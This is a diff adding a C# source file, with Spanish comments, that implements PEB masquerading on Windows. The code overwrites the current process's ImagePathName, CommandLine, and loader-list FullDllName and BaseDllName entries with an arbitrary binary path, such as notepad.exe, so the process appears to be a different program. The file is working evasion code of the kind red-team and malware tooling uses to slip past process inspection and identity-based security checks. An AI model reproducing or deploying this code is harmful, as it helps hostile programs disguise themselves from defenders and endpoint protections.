@@ -1,0 +1,240 @@
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using static ModificarPEB.Structs;
+
+namespace ModificarPEB
+{
+    internal class Masquerade
+    {
+        // Esta función sobrescribe una estructura UNICODE_STRING en la memoria de un proceso.
+        // Específicamente, se utiliza para modificar cadenas dentro de la estructura PEB de un proceso.
+        public static void Emit_UNICODE_STRING(IntPtr hProcess, IntPtr lpBaseAddress, UInt32 dwSize, string data)
+        {
+            // Establece la protección de acceso a la memoria -> PAGE_EXECUTE_READWRITE
+            UInt32 lpfOldProtect = 0;
+            bool CallResult = false;
+            CallResult = Kernel32.VirtualProtectEx(hProcess, lpBaseAddress, dwSize, 0x40, ref lpfOldProtect);
+
+            // Crea una nueva estructura UNICODE_STRING con los datos proporcionados
+            UNICODE_STRING UnicodeObject = new UNICODE_STRING();
+            string UnicodeObject_Buffer = data;
+            UnicodeObject.Length = (ushort)(UnicodeObject_Buffer.Length * 2);
+            UnicodeObject.MaximumLength = (ushort)(UnicodeObject.Length + 1);
+            UnicodeObject.Buffer = Marshal.StringToHGlobalUni(UnicodeObject_Buffer);
+            IntPtr InMemoryStruct = new IntPtr();
+            InMemoryStruct = Marshal.AllocHGlobal((int)dwSize);
+            Marshal.StructureToPtr(UnicodeObject, InMemoryStruct, true);
+
+            //Console.WriteLine("[>] Overwriting Current Process Information");
+
+            // Sobrescribe la estructura UNICODE_STRING en el PEB del proceso
+            UInt32 lpNumberOfBytesWritten = 0;
+            CallResult = Kernel32.WriteProcessMemory(hProcess, lpBaseAddress, InMemoryStruct, dwSize, ref lpNumberOfBytesWritten);
+
+            // Libera la memoria asignada para la estructura en la memoria
+            Marshal.FreeHGlobal(InMemoryStruct);
+        }
+
+        // Esta función selecciona el proceso actual y obtiene información sobre su estructura PEB.
+        // Luego, modifica el ImagePathName y CommandLine dentro del PEB para ocultar el binario original.
+        public static string SelectedProcess(string BinPath)
+        {
+            bool x32Architecture = false;
+            string processName = Process.GetCurrentProcess().ProcessName;
+
+            // Verifica si el proceso es de 32 bits o 64 bits
+            if (IntPtr.Size == 4)
+            {
+                x32Architecture = true;
+                Console.WriteLine("[+] Current Process is 32 bits");
+            }
+            else
+            {
+                Console.WriteLine("[+] Current Process is 64 bits");
+            }
+
+            Console.WriteLine("[+] Getting Process Information");
+
+            // Obtiene el handle del proceso actual y la información básica del proceso
+            IntPtr ProcHandle = Process.GetCurrentProcess().Handle;
+            _PROCESS_BASIC_INFORMATION PROCESS_BASIC_INFORMATION = new _PROCESS_BASIC_INFORMATION();
+            int PROCESS_BASIC_INFORMATION_Size = System.Runtime.InteropServices.Marshal.SizeOf(PROCESS_BASIC_INFORMATION);
+            Int32 returnLength = new Int32();
+
+            int CallResult = Ntdll.NtQueryInformationProcess(ProcHandle, 0, ref PROCESS_BASIC_INFORMATION, PROCESS_BASIC_INFORMATION_Size, ref returnLength);
+
+            Console.WriteLine("[+] PID " + PROCESS_BASIC_INFORMATION.UniqueProcessId.ToString());
+            Console.WriteLine("[+] GetCurrentProcess().MainModule.FileName = " + Process.GetCurrentProcess().MainModule.FileName);
+
+            if (x32Architecture)
+                Console.WriteLine("[+] PebBaseAddress: 0x{0:X8}", PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt32());
+            else
+                Console.WriteLine("[+] PebBaseAddress: 0x{0:X16}", PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64());
+
+            _PEB _PEB = new _PEB();
+
+            long BufferOffset = PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64();
+
+            IntPtr newIntPtr = new IntPtr(BufferOffset);
+
+            //check
+            // found this somewhere in internet https://social.msdn.microsoft.com/Forums/sqlserver/en-US/64439444-c889-4d4b-a89f-b8f7e0e25827/problems-in-marshalptrtostructure?forum=clr
+            // Carga la estructura PEB desde la memoria del proceso
+            _PEB PEBFlags = new _PEB();
+            PEBFlags = (_PEB)Marshal.PtrToStructure(newIntPtr, typeof(_PEB));
+
+            // Establece un bloqueo en la PEB para trabajar con ella
+            if (x32Architecture)
+                Ntdll.RtlEnterCriticalSection(PEBFlags.FastPebLock32);
+            else
+                Ntdll.RtlEnterCriticalSection(PEBFlags.FastPebLock64);
+
+            Console.WriteLine("[+] Setting Lock to work with the PEB");
+            Console.WriteLine("[!] RtlEnterCriticalSection --> &Peb->FastPebLock");
+
+            // Calcula las direcciones de las estructuras ImagePathName y CommandLine dentro del PEB
+            long ImagePathName = 0;
+            long CommandLine = 0;
+            UInt32 StructSize = 0;
+
+            if (x32Architecture)
+            {
+                long PROCESS_PARAMETERS = PEBFlags.ProcessParameters32.ToInt64();
+                StructSize = 8;
+
+                ImagePathName = PROCESS_PARAMETERS + 0x38;
+                CommandLine = PROCESS_PARAMETERS + 0x40;
+            }
+            else
+            {
+                long PROCESS_PARAMETERS = PEBFlags.ProcessParameters64.ToInt64();
+                StructSize = 16;
+
+                ImagePathName = PROCESS_PARAMETERS + 0x60;
+                CommandLine = PROCESS_PARAMETERS + 0x70;
+            }
+
+            IntPtr ImagePathNamePtr = new IntPtr(ImagePathName);
+            IntPtr CommandLinePtr = new IntPtr(CommandLine);
+
+            // Imprime las direcciones de las estructuras para diagnóstico
+            if (x32Architecture)
+            {
+                Console.WriteLine("[+] Getting the PEB ProcessParameters.ImagePathName Address: 0x{0:X8}", ImagePathName);
+                Console.WriteLine("[+] Getting the PEB ProcessParameters.CommandLine Address: 0x{0:X8}", CommandLine);
+            }
+            else
+            {
+                Console.WriteLine("[+] Getting the PEB ProcessParameters.ImagePathName Address: 0x{0:X16}", ImagePathName);
+                Console.WriteLine("[+] Getting the PEB ProcessParameters.CommandLine Address: 0x{0:X16}", CommandLine);
+            }
+
+            //string BinPath = @"C:\Windows\System32\notepad.exe";
+
+            // Sobrescribe las estructuras ImagePathName y CommandLine dentro del PEB
+            Emit_UNICODE_STRING(ProcHandle, ImagePathNamePtr, StructSize, BinPath);
+            Emit_UNICODE_STRING(ProcHandle, CommandLinePtr, StructSize, BinPath);
+
+            Console.WriteLine("[+] Printing new GetCurrentProcess().MainModule.FileName = " + Process.GetCurrentProcess().MainModule.FileName);
+
+
+            //&Peb->Ldr
+            // Procesa la lista de módulos cargados (InLoadOrderModuleList) dentro del PEB
+            _PEB_LDR_DATA _PEB_LDR_DATA = new _PEB_LDR_DATA();
+            var typePEB_LDR_DATA = _PEB_LDR_DATA.GetType();
+
+            // Actualiza la variable de offset con la dirección de LDR en el PEB
+            if (x32Architecture)
+                BufferOffset = PEBFlags.Ldr32.ToInt64();
+            else
+                BufferOffset = PEBFlags.Ldr64.ToInt64();
+
+            //reusing variables keep in mind
+            newIntPtr = new IntPtr(BufferOffset);
+            _PEB_LDR_DATA LDRFlags = new _PEB_LDR_DATA();
+            LDRFlags = (_PEB_LDR_DATA)Marshal.PtrToStructure(newIntPtr, typeof(_PEB_LDR_DATA));
+
+            //&Peb->Ldr->InLoadOrderModuleList->Flink
+            _LDR_DATA_TABLE_ENTRY _LDR_DATA_TABLE_ENTRY = new _LDR_DATA_TABLE_ENTRY();
+            BufferOffset = LDRFlags.InLoadOrderModuleList.Flink.ToInt64();
+            newIntPtr = new IntPtr(BufferOffset);
+
+            //Traverse doubly linked list
+            //&Peb->Ldr->InLoadOrderModuleList->InLoadOrderLinks->Flink
+            //This is probably overkill, should always be the first entry for InLoadOrderLinks
+
+            Console.WriteLine("[?] Traversing &Peb->Ldr->InLoadOrderModuleList doubly linked list");
+
+            IntPtr ListIndex = new IntPtr();
+            _LDR_DATA_TABLE_ENTRY LDREntry = new _LDR_DATA_TABLE_ENTRY();
+
+            long FullDllName = 0;
+            long BaseDllName = 0;
+            int count = 1;
+
+            // Recorre la lista hasta encontrar el módulo que coincida con el nombre del proceso
+            while (ListIndex != LDRFlags.InLoadOrderModuleList.Blink)
+            {
+                LDREntry = (_LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(newIntPtr, typeof(_LDR_DATA_TABLE_ENTRY));
+
+                if (Marshal.PtrToStringUni(LDREntry.FullDllName.Buffer).Contains(processName))
+                {
+                    count++;
+                    if (x32Architecture)
+                    {
+                        StructSize = 8;
+
+                        FullDllName = BufferOffset + 0x24;
+                        BaseDllName = BufferOffset + 0x2C;
+                    }
+                    else
+                    {
+                        StructSize = 16;
+
+                        FullDllName = BufferOffset + 0x48;
+                        BaseDllName = BufferOffset + 0x58;
+                    }
+
+                    // Sobrescribe las estructuras FullDllName y BaseDllName dentro de _LDR_DATA_TABLE_ENTRY
+                    IntPtr FullDllNamePtr = new IntPtr(FullDllName);
+                    IntPtr BaseDllNamePtr = new IntPtr(BaseDllName);
+
+                    if (x32Architecture)
+                    {
+                        Console.WriteLine("[>] Overwriting _LDR_DATA_TABLE_ENTRY.FullDllName: 0x{0:X8}", FullDllName);
+                        Console.WriteLine("[>] Overwriting _LDR_DATA_TABLE_ENTRY.BaseDllName: 0x{0:X8}", BaseDllName);
+                    }
+                    else
+                    {
+                        Console.WriteLine("[>] Overwriting _LDR_DATA_TABLE_ENTRY.FullDllName: 0x{0:X16}", FullDllName);
+                        Console.WriteLine("[>] Overwriting _LDR_DATA_TABLE_ENTRY.BaseDllName: 0x{0:X16}", BaseDllName);
+                    }
+
+                    Emit_UNICODE_STRING(ProcHandle, FullDllNamePtr, StructSize, BinPath);
+                    Emit_UNICODE_STRING(ProcHandle, BaseDllNamePtr, StructSize, BinPath);
+                }
+
+                // Avanza al siguiente módulo en la lista
+                BufferOffset = LDREntry.InLoadOrderLinks.Flink.ToInt64();
+                ListIndex = (IntPtr)BufferOffset;
+                newIntPtr = new IntPtr(BufferOffset);
+            }
+            Console.WriteLine("\nCount = " + count.ToString());
+
+            // Libera el bloqueo en la PEB
+            if (x32Architecture)
+                Ntdll.RtlLeaveCriticalSection(PEBFlags.FastPebLock32);
+            else
+                Ntdll.RtlLeaveCriticalSection(PEBFlags.FastPebLock64);
+
+            Console.WriteLine("[+] Releasing the PEB Lock");
+            Console.WriteLine("[!] RtlLeaveCriticalSection --> &Peb->FastPebLock");
+
+            Console.WriteLine("[+] Printing new GetCurrentProcess().MainModule.FileName = " + Process.GetCurrentProcess().MainModule.FileName);
+
+            return Process.GetCurrentProcess().MainModule.FileName;
+        }
+        
+    }
+}
